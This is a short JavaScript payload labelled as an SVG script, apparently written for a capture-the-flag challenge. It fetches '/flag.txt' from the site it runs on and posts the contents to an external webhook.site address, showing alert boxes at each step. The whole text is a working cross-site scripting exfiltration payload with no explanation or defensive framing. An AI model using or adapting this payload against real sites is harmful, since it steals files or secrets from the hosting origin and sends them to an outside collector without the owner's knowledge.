svg.script:
alert('Script started');
fetch('/flag.txt')
  .then(response => {
    alert('Got response: ' + response.status);
    return response.text();
  })
  .then(data => {
    alert('Got data: ' + data);
    fetch('https://webhook.site/582e502c-88ba-4c5a-9eda-2c2e1a3b289b', {
      method: 'POST',
      body: data
    }).then(() => alert('Sent to webhook'));
  })
  .catch(error => {
    alert('Error: ' + error);
  });
